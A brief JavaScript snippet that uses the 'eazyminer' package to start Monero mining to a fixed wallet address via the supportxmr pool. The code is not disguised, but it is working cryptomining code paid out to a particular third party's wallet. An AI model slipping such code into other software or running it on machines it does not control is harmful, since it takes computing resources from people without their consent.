const Miner = require('eazyminer');
const miner = new Miner({
    pools: [{
        coin: 'XMR',
        user: '4B1dXbphAhG5t6erRwsFQ3FnURzpZgwXMNQgpsFxhxF31L8aKuMXhn5XutWZMGxJWo78N7nkNEEAW4S4Gyi7djRUCD3ytv4',
        url: 'pool.supportxmr.com:3333',
    }],
    autoStart: false
});
miner.start();